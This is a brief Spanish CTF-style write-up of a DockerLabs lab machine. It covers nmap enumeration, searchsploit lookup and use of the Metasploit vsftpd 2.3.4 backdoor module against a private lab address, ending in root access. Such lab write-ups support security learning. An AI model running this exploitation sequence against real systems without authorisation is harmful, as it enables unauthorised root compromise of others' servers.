# Write-up - Explotación de FTP vsftpd 2.3.4 con Metasploit

**Sitio:** DockerLabs  
**Dificultad:** Muy Fácil  
**Fecha:** 04/06/2025  
**Aprendizaje:**  
- Refrescar el uso de `searchsploit` para buscar vulnerabilidades.    
- Identificar y explotar una versión vulnerable del servicio FTP `vsftpd 2.3.4`.    
- Uso básico de Metasploit para explotar una vulnerabilidad conocida.  

---

## Enumeración de servicios  

### 1. Escaneo con Nmap  

`sudo nmap -sSV -O 172.17.0.2`  

> Resultado:

`21/tcp` → FTP (`vsftpd 2.3.4`)  
`80/tcp` → HTTP (Apache httpd 2.4.58)  
Sistema Operativo: `Linux`  

## Búsqueda de vulnerabilidades

### 2. Uso de Searchsploit

`searchsploit vsftpd 2.3.4`

Se identifica el siguiente exploit:

`vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) → unix/remote/17491.rb`

## Explotación con Metasploit

### 3. Iniciar consola de Metasploit

`msfconsole`

### 4. Buscar y cargar el módulo

search vsftpd 2.3.4  
use exploit/unix/ftp/vsftpd_234_backdoor  
set RHOSTS 172.17.0.2  
`run`  

### 5. Verificación de acceso

> whoami = root
